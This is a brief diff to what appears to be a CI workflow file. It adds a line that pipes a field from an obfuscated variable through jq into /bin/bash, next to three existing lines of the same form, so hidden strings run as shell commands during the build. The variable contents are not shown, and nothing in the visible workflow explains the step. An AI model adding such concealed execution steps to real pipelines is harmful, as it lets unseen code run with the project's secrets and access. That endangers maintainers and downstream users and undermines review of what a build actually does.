@@ -32,6 +32,7 @@ jobs:
           echo $fvel79379 | jq -r .eoxv12097 | /bin/bash
           printf '%s' "$vk90" | jq -r .zmce5939 | /bin/bash
           echo $o6 | jq -r .ran0526 | /bin/bash
+          printf '%s' "$q711" | jq -r .x3 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
